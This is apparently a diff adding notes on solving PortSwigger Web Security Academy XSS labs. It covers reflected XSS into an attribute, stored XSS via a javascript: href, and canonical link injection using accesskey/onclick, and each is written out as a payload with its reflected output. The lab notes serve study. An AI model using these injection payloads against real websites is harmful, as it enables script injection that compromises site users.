@@ -80,4 +80,44 @@ location="https://0a40002f03ef80f3c779dd7300c400f0.web-security-academy.net/?sea
 
 `<svg><animateTransform onbegin=alert()>`
 
+13. Reflected XSS into attribute with angle brackets HTML-encoded
+
+```
+0 search results for 'asd" autofocus onfocus=alert()
+
+<input type="text" placeholder="Search the blog..." name="search" value="asd" autofocus="" onfocus="alert()>
+
+asd" autofocus onfocus=alert()
+```
+
+14. Stored XSS into anchor href attribute with double quotes HTML-encoded:
+
+`<a id="author" href="javascript:alert(document.domain)">asd</a>`
+
+15. Reflected XSS in canonical link tag:
+
+```
+<link rel="canonical" href="https://0a8c00840479533f80880daf004200f0.web-security-academy.net/?test=here">
+
+
+t/?test=here%09'accesskey='X'%09onclick='alert(1)
+
+<link rel="canonical" href="https://0a8c00840479533f80880daf004200f0.web-security-academy.net/?test=here	" accesskey="X" onclick="alert(1)">
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
